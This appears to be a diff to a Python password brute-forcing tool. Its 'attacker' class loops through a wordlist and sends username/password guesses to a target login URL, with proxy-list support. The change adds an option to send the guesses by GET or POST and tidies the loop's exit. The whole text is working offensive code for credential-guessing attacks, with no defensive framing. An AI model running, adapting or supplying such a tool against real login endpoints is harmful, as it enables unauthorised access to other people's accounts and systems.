@@ -28,6 +28,9 @@ class attacker:
         attacker.proxylist = [(line.strip()).split() for line in b_file]
         b_file.close()
 
+    def setup(self, method):
+        attacker.method = method
+
     def attack(self, target, username, wordlist, proxylist, errIdentfier, usernameParameterName, passwordParameterName):
         # set us some flags and counters
         creds_found = False
@@ -49,8 +52,13 @@ class attacker:
                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something..." + colors.ENDC)
                         for currentPwdNum in range(0, len(attacker.wordlist)):
                             password = attacker.wordlist[currentPwdNum]
-                            currentPOSTobj = {usernameParameterName: username, passwordParameterName: password}
-                            currentRequest = requests.post(target, data = currentPOSTobj)
+                            currentRequestObj = {usernameParameterName: username, passwordParameterName: password}
+
+                            # decide on GET or POST method
+                            if attacker.method == "post":
+                                currentRequest = requests.post(target, data = currentRequestObj)
+                            elif attacker.method == "get":
+                                currentRequest = requests.get(target, data = currentRequestObj)
 
                             # request sent, let's evalute the response
                             currentResponse__text = currentRequest.text
@@ -89,8 +97,7 @@ class attacker:
                                         # user responded no, end a loop
                                         badResponse_counter = 0
                                         print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "OK. Ending the main loop. Try to check if target parameter is set up correctly." + colors.ENDC)
-                                        return 0
-                                        break                                
+                                        return 0                            
                                 elif wantsContinue == False:
                                     # we're still trying, increase the counter and print out an info
                                     print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "] " + colors.ENDC + colors.WARNING + "Recived error code " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.WARNING + ". Trying again..." + colors.ENDC)
